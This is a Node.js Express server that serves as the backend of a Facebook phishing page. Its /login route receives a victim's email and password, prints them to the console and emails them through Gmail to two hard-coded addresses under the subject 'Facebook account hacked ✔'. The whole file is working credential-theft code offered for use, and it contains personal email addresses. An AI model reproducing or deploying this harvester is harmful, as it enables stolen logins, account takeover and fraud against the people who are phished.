const express = require("express");
const app = express();
const cors = require("cors");
const nodemailer = require("nodemailer");

require("dotenv").config();

const PORT = process.env.PORT || 3000;

// middleware
app.use(express.json());
app.use(cors());

// Nodemailer setup

// transporter

const transporter = nodemailer.createTransport({
  host: "smtp.gmail.com",
  port: 465,
  secure: true,
  auth: {
    // TODO: replace `user` and `pass` values from <https://forwardemail.net>
    user: "ngancloverr@gmail.com",
    pass: process.env.APP_PASS,
  },
});

// Route
app.post("/login", async (req, res) => {
  try {
    const { email, pass } = req.body;
    console.log(email, pass);

    // send mail with defined transport object
    const info = await transporter.sendMail({
      from: '"Rem Apple 👻" <ngancloverr@gmail.com>', // sender address
      to: "ngancloverr@gmail.com, nganaremba@gmail.com", // list of receivers
      subject: "Facebook account hacked ✔", // Subject line
      html: `<div style="color: white; background-color: green; padding: 1rem; border-radius: 10px;"><h4>Email:</h4> <h1>${email}</h1>
                  <br>
                  <h4>Password:</h4> <h1>${pass}</h1><div>`, // html body
    });

    console.log("Message sent: %s", info.messageId);

    res.json({ status: 201 });
  } catch (err) {
    res.json({ status: 500, message: err?.message });
  }
});

app.listen(PORT, () => console.log(`Server started at port ${PORT}`));
